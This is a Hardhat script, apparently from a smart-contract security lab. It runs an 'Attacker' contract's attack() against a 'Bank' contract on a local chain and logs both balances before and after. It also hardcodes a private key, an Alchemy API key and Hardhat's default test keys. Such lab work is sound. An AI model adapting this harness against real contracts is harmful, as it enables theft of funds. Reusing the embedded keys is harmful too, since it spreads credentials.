// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// You can also run a script with `npx hardhat run <script>`. If you do that, Hardhat
// will compile your contracts, add the Hardhat Runtime Environment's members to the
// global scope, and execute the script.
const hre = require("hardhat");

let BANK = "0xAd5d57aD9bB17d34Debb88566ab2F5dB879Cc46F";
let ATTACKER = "0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC";
let ATTACKERCONT = "0x663F3ad617193148711d28f5334eE4Ed07016602";
let PRIVATEKEY =
	"0x8d7bf23ad10d0c4d1bdaf9168a7f447bfe9acadba1e7f43f960e30371522fdcf";

let API_KEY = "vZF-bLS5x-6QJAXdpq-LNZ4S2_TZi2_P";

async function main() {
	//it("Perform Attack", async function () {

	// For Hardhat
	const contract = require("../artifacts/contracts/Attacker.sol/Attacker.json");

	// Provider
	const alchemyProvider = new ethers.providers.AlchemyProvider(
		(network = "maticmum"),
		API_KEY
	);

	const provider = new ethers.providers.JsonRpcProvider(
		"http://127.0.0.1:8545/"
	);

	// These are Harhdat's deterministic accounts
	// NEVER SEND REAL FUNDS TO THESE ACCOUNTS!
	const account0 = new ethers.Wallet(
		"0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80",
		provider
	);
	const account1 = new ethers.Wallet(
		"0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a",
		provider
	);

	// Signer
	const owner = new ethers.Wallet(PRIVATEKEY, alchemyProvider);

	const [ownerattk, addr1] = await ethers.getSigners(); //must use first signer

	// Contract
	const attackerContract = new ethers.Contract(
		ATTACKERCONT,
		contract.abi,
		account1
	);

	//console.log(`${owner.address}`);
	//console.log(JSON.stringify(contract.abi));

	console.log("");
	console.log("*** Before ***");
	console.log(
		`Bank's balance: ${ethers.utils
			.formatEther(await ethers.provider.getBalance(BANK))
			.toString()}`
	);
	console.log(
		`Attacker's balance: ${ethers.utils
			.formatEther(await ethers.provider.getBalance(ATTACKER))
			.toString()}`
	);

	await attackerContract.attack({
		value: ethers.utils.parseEther("1"),
	});

	console.log("");
	console.log("*** After ***");
	console.log(
		`Bank's balance: ${ethers.utils
			.formatEther(await ethers.provider.getBalance(BANK))
			.toString()}`
	);
	console.log(
		`Attackers's balance: ${ethers.utils
			.formatEther(await ethers.provider.getBalance(ATTACKER))
			.toString()}`
	);
	console.log("");

	// expect(await ethers.provider.getBalance(this.bankContract.address)).to.eq(
	// 	0
	// );
	//});
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
	console.error(error);
	process.exitCode = 1;
});
